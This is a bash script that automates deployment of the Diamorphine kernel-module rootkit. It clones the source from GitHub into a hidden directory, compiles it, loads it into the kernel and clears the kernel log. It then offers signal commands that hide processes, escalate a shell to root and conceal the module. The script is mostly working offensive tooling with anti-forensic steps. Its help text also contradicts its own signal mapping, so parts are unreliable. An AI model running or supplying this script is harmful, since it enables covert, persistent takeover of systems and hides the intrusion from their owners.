#!/bin/bash
#
# Diamorphine Rootkit Auto-Deploy (T1014)
# Automated deployment of the Diamorphine LKM rootkit
# Source: github.com/m0nad/Diamorphine
#

if [[ $(id -u) -ne 0 ]]; then
    echo "[ERROR] You must run this script as root" >&2
    exit 1
fi

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
CLONE_DIR="/var/tmp/.d3m0n_diamorphine"

echo -e "${CYAN}"
echo "  ╔═══════════════════════════════════════════════════════╗"
echo "  ║        Diamorphine Rootkit Auto-Deploy (T1014)        ║"
echo "  ║   Signal-based LKM rootkit with process/file hiding   ║"
echo "  ╚═══════════════════════════════════════════════════════╝"
echo -e "${NC}"

echo -e "  ${CYAN}[1]${NC} Install Diamorphine (git clone + make + insmod)"
echo -e "  ${CYAN}[2]${NC} Hide a process (kill -31 PID)"
echo -e "  ${CYAN}[3]${NC} Elevate to root (kill -64 PID)"
echo -e "  ${CYAN}[4]${NC} Toggle module visibility (kill -63 PID)"
echo -e "  ${CYAN}[5]${NC} Check status"
echo -e "  ${CYAN}[6]${NC} Uninstall / cleanup"
echo ""
read -p "Choice [1-6]: " OPT

case "$OPT" in
    1)
        for cmd in git make gcc insmod; do
            command -v "$cmd" >/dev/null 2>&1 || { echo -e "${RED}[-] $cmd not found. Install it first.${NC}"; exit 1; }
        done

        HEADERS="/lib/modules/$(uname -r)/build"
        [[ ! -d "$HEADERS" ]] && { echo -e "${RED}[-] Kernel headers not found at $HEADERS${NC}"; exit 1; }

        rm -rf "$CLONE_DIR"
        echo -e "${YELLOW}[*] Cloning Diamorphine...${NC}"
        git clone https://github.com/m0nad/Diamorphine "$CLONE_DIR" 2>/dev/null

        if [[ ! -f "$CLONE_DIR/diamorphine.c" ]]; then
            echo -e "${RED}[-] Clone failed${NC}"
            exit 1
        fi

        echo -e "${YELLOW}[*] Building...${NC}"
        make -C "$CLONE_DIR" 2>&1 | tail -3

        if [[ ! -f "$CLONE_DIR/diamorphine.ko" ]]; then
            echo -e "${RED}[-] Build failed${NC}"
            exit 1
        fi

        echo -e "${YELLOW}[*] Loading module...${NC}"
        insmod "$CLONE_DIR/diamorphine.ko"
        if [[ $? -eq 0 ]]; then
            echo -e "${GREEN}[+] Diamorphine loaded successfully!${NC}"
            dmesg -C 2>/dev/null
        else
            echo -e "${RED}[-] insmod failed (kernel version mismatch?)${NC}"
            exit 1
        fi

        echo -e "${YELLOW}[*] Cleaning build artifacts...${NC}"
        make -C "$CLONE_DIR" clean 2>/dev/null
        rm -rf "$CLONE_DIR"

        echo ""
        echo -e "${GREEN}  Signal controls:${NC}"
        echo -e "    kill -31 <PID>  → Hide/unhide a process"
        echo -e "    kill -63 <PID>  → Elevate process to root"
        echo -e "    kill -64 <PID>  → Toggle module visibility in lsmod"
        ;;
    2)
        read -p "Enter PID to hide: " TPID
        [[ -z "$TPID" ]] && { echo -e "${RED}[-] No PID given${NC}"; exit 1; }
        kill -31 "$TPID" 2>/dev/null
        echo -e "${GREEN}[+] Sent signal 31 to PID $TPID (toggle hide)${NC}"
        ;;
    3)
        kill -64 $$ 2>/dev/null
        echo -e "${GREEN}[+] Sent signal 64 to current shell (PID $$)${NC}"
        echo -e "${YELLOW}[*] Verify: id${NC}"
        id
        ;;
    4)
        kill -63 $$ 2>/dev/null
        echo -e "${GREEN}[+] Toggled module visibility${NC}"
        echo -e "${YELLOW}[*] Check: lsmod | grep diamorphine${NC}"
        lsmod | grep diamorphine || echo "(hidden)"
        ;;
    5)
        echo -e "${YELLOW}[*] Checking Diamorphine status...${NC}"
        if lsmod 2>/dev/null | grep -q diamorphine; then
            echo -e "${GREEN}[+] Module visible in lsmod${NC}"
        else
            echo -e "${YELLOW}[?] Module not in lsmod (may be hidden or not loaded)${NC}"
            if [[ -d /proc/modules ]] || grep -q diamorphine /proc/modules 2>/dev/null; then
                echo -e "${GREEN}[+] Found in /proc/modules — loaded but hidden${NC}"
            fi
        fi
        echo -e "${YELLOW}[*] Kernel taint: $(cat /proc/sys/kernel/tainted)${NC}"
        ;;
    6)
        echo -e "${YELLOW}[*] Attempting to unhide module first...${NC}"
        kill -63 $$ 2>/dev/null
        sleep 0.5
        if rmmod diamorphine 2>/dev/null; then
            echo -e "${GREEN}[+] Module removed${NC}"
        else
            echo -e "${RED}[-] rmmod failed — module may not be loaded or is still hidden${NC}"
        fi
        rm -rf "$CLONE_DIR"
        echo -e "${GREEN}[+] Cleanup done${NC}"
        ;;
    *)
        echo "Invalid option"
        ;;
esac
